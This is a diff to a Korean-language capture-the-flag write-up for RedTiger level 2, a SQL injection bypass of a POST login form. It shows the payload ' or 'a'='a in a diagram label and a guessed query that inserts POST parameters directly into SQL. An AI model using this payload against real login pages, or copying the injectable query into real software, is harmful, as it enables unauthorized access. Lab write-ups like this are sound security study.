@@ -2,6 +2,8 @@
 [redtiger] level2
 ================================================================================================================
 
+|
+
 .. graphviz::
 
     digraph G {
@@ -21,29 +23,25 @@
             "server" -> step1 -> step3 -> step5;
         }
         step0 -> step1[label="post_data: {username=' or 'a'='a&password=' or 'a'='a}",arrowhead="normal"];
-        step3 -> step2[label="@solve",arrowhead="normal"];
+        step3 -> step2[label="login success",arrowhead="normal"];
     }
 
 |
 
-Source Analysis
+server -> DB 예측
 ================================================================================================================
 
-- POST 로그인 페이지 취약점
-- MySQL, Or String Injection
+- POST 파라미터: username, password
 
-.. code-block:: html
+.. code-block:: sql
 
-    <form method="POST">
-        Username: <input type="text" name="username"><br>
-        Password: <input type="password" name="password"><br>
-        <input type="submit" name="login" value="Login">
-    </form>
-    
+    SELECT * FROM tb_name where 
+    username='$_POST["username"]' AND 
+    password='$_POST["password"]'    
 
 |
 
-or String injection
+or
 ================================================================================================================
 
 .. code-block:: python
@@ -67,3 +65,4 @@ or String injection
 
     print r.content
 
+|
